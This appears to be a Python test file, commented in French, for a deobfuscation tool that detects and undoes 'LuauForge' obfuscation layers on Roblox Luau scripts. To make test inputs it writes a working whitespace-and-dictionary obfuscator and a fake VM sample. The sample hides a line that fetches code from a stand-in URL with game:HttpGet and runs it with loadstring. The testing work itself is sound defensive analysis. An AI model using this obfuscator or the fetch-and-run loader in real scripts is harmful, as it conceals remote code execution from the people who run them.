#!/usr/bin/env python3
"""
Moteur `luauforge` : fabrique un script protege par les DEUX couches statiques de LuauForge (espaces/tabulations puis
dictionnaire de mots), verifie qu'il est reconnu (avec ou sans l'en-tete), puis defait de bout en bout par le routeur.

Usage : python3 tests/test_luauforge.py
"""
import re
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
import deobf_router as R  # noqa: E402

FAILS = []


def check(cond, label):
    print(("OK   " if cond else "FAIL ") + label)
    if not cond:
        FAILS.append(label)


INNER = ('local Players = game:GetService("Players")\n'
         'local function greet(name)\n  return "hello " .. name\nend\n'
         'print(greet(Players.LocalPlayer.Name))\nreturn greet\n')
WORDS = ["function", "local", "return", "print"]


def dict_layer(code: str) -> str:
    s = code
    for i, w in enumerate(WORDS, 1):
        s = s.replace(w, "\x01" + chr(64 + i))
    d = ",".join('"%s"' % w for w in WORDS)
    return (f"local __d={{{d}}}\nlocal __s=[=[{s}]=]\n"
            "for __i=#__d,1,-1 do local __p=string.char(1,64+__i) local __a, __b={}, 1 while true do local __x,__y="
            "__s:find(__p,__b,true) if not __x then break end __a[#__a+1]=__s:sub(__b,__x-1) __a[#__a+1]=__d[__i] "
            "__b=__y+1 end __a[#__a+1]=__s:sub(__b) __s=table.concat(__a) end\n"
            "return (loadstring or load)(__s)(...)\n")


def blank_layer(code: str, header: bool = True) -> str:
    key = "LUAUFORGE"
    k = len(key)
    chars = bytes([32, 9, 11, 12])
    enc = bytearray()
    for b in code.encode("latin-1"):
        v = (b + k) % 256
        enc += bytes(chars[(v >> sh) & 3] for sh in (6, 4, 2, 0))
    half = (len(enc) // 8) * 4
    blocks = [bytes(enc[:half]), bytes(enc[half:])]
    dec = ("local function __dec(w) local o,b,n,v,k={},{},0,0,0 local u=unpack or table.unpack for i=2,#w do local c=w:byte(i) "
           "local d=(c==32 and 0) or (c==9 and 1) or (c==11 and 2) or (c==12 and 3) if d then v=v*4+d n=n+1 if n==4 then "
           "k=k+1 b[k]=v n=0 v=0 if k==64 then o[#o+1]=string.char(u(b,1,k)) k=0 end end end end "
           "if k>0 then o[#o+1]=string.char(u(b,1,k)) end return table.concat(o) end\n")
    out = ("-- luauforge | https://luauforge-obf.netlify.app\n" if header else "")
    out += f"local __k=#('{key}')\n"
    for i, blk in enumerate(blocks, 1):
        out += f"local __w{i}=[[W{blk.decode('latin-1')}]]\n"
    out += dec + "local __raw=__dec(__w1)..__dec(__w2)\n"
    out += ("local __out,__bat,__bk={}, {}, 0\nlocal __u=unpack or table.unpack\n"
            "for __i=1,#__raw do __bk=__bk+1 __bat[__bk]=(__raw:byte(__i)-__k)%256 if __bk==64 then __out[#__out+1]="
            "string.char(__u(__bat,1,__bk)) __bk=0 end end\nif __bk>0 then __out[#__out+1]=string.char(__u(__bat,1,__bk)) end\n"
            "local __src=table.concat(__out)\nlocal __fn=(loadstring or load)(__src)\nif type(__fn)~='function' then return end\n"
            "return __fn(...)\n")
    return out


with tempfile.TemporaryDirectory() as td:
    td = Path(td)
    for header in (True, False):
        src = td / ("forged_h.lua" if header else "forged_nh.lua")
        src.write_bytes(blank_layer(dict_layer(INNER), header).encode("latin-1"))
        det = R.detect_text(R.read_text(src))
        check(bool(det) and det[0][0] == "luauforge" and det[0][1] >= R.MIN_CONFIDENCE,
              f"LuauForge {'avec' if header else 'sans'} en-tete reconnu ({det[0][:2] if det else None})")
        out = td / "out.lua"
        res = R.deobfuscate(src, out)
        text = out.read_text("utf-8", "replace") if out.exists() else ""
        check(res.get("ok") and res.get("engine") == "luauforge", f"deobfusque par le routeur ({res.get('engine')}, ok={res.get('ok')})")
        check(text.endswith(INNER) or INNER in text, "le script d'origine est restitue EXACTEMENT")
        check("2. dictionnaire de mots" in text and "1. espaces/tabulations" in text, "les deux couches retirees sont annoncees")
    # une seule couche (« blanc » seul)
    src = td / "one.lua"
    src.write_bytes(blank_layer(INNER).encode("latin-1"))
    out = td / "one_out.lua"
    res = R.deobfuscate(src, out)
    check(res.get("ok") and INNER in out.read_text("utf-8", "replace"), "une seule couche (espaces/tabulations) : restituee")
    # script quelconque : jamais pris pour du LuauForge
    plain = td / "plain.lua"
    plain.write_text(INNER)
    det = R.detect_text(R.read_text(plain))
    check(not any(n == "luauforge" for n, _, _ in det), "un script en clair n'est pas pris pour du LuauForge")
    # entree tronquee / bidonnee : echec propre, pas de plantage
    bad = td / "bad.lua"
    bad.write_bytes(b"-- luauforge | https://luauforge-obf.netlify.app\nlocal __k=#('X')\nlocal __w1=[[W   ]]\n")
    res = R.deobfuscate(bad, td / "bad_out.lua", engine_name="luauforge")
    check(not res.get("ok"), "entree bidonnee : echec propre")


# -- machine virtuelle restante : executee dans le bac a sable ------------------------------------------------------
def vm_like(url: str) -> str:
    """Une « machine virtuelle » factice mais assez ressemblante pour etre reconnue (newproxy, getfenv, >8 fonctions, >20
    constantes chiffrees « l... »), dont le vrai programme est cache derriere une globale a NOM ALEATOIRE : lue avant d'avoir
    ete ecrite elle vaut nil dans un vrai etat Roblox (si le bac a sable la remplace par un faux objet, le programme ne
    s'execute jamais -- c'est exactement le defaut qui bloquait les vraies machines LuauForge)."""
    consts = ",".join('"lA%dxQ%d"' % (i, i * 7) for i in range(30))
    funcs = "\n".join("local function h%d(a) return a end" % i for i in range(10))
    return (f"local X = ((getfenv and getfenv()) or _ENV)\nlocal N = newproxy\nlocal K = {{{consts}}}\n{funcs}\n"
            "local Folder = Instance.new(\"Folder\")\nFolder.Name = \"yj3Jyuv\"\nFolder.Parent = nil\nFolder:Destroy()\n"
            "if X[\"LPNAWR0rtFSf\"] == nil then\n"
            f"  local response = game:HttpGet(\"{url}\")\n  loadstring(response)()\nend\n")


import importlib.util  # noqa: E402
_spec = importlib.util.spec_from_file_location("lf_run", str(ROOT / "engines" / "luauforge" / "run.py"))
LF = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(LF)
check(LF.looks_like_vm(vm_like("http://example.test/x").encode()), "la machine virtuelle factice est reconnue comme telle")
check(not LF.looks_like_vm(INNER.encode()), "un script ordinaire n'est pas pris pour une machine virtuelle")
with tempfile.TemporaryDirectory() as td:
    td = Path(td)
    src = td / "vm.lua"
    src.write_bytes(blank_layer(dict_layer(vm_like("http://example.test/stage2.lua"))).encode("latin-1"))
    out = td / "vm_out.lua"
    res = R.deobfuscate(src, out, engine_name="luauforge", timeout=600)
    text = out.read_text("utf-8", "replace") if out.exists() else ""
    check(res.get("ok") and "machine virtuelle executee dans le bac a sable" in res.get("log", ""),
          f"machine virtuelle executee dans le bac a sable (ok={res.get('ok')})")
    check('game:HttpGet("http://example.test/stage2.lua")' in text and "loadstring(response)()" in text,
          "le programme reel apparait : HttpGet + loadstring (la globale a nom aleatoire valait bien nil)")
    check("PROGRAMME" in text and "leurres" in text, "l'en-tete explique ce qui a ete fait")
    check(len(text) < 5000, f"la machine virtuelle elle-meme n'est PAS recopiee dans le resultat ({len(text)} octets)")

print()
if FAILS:
    print(f"ECHEC : {len(FAILS)} test(s)")
    sys.exit(1)
print("TOUT OK : moteur luauforge verifie")
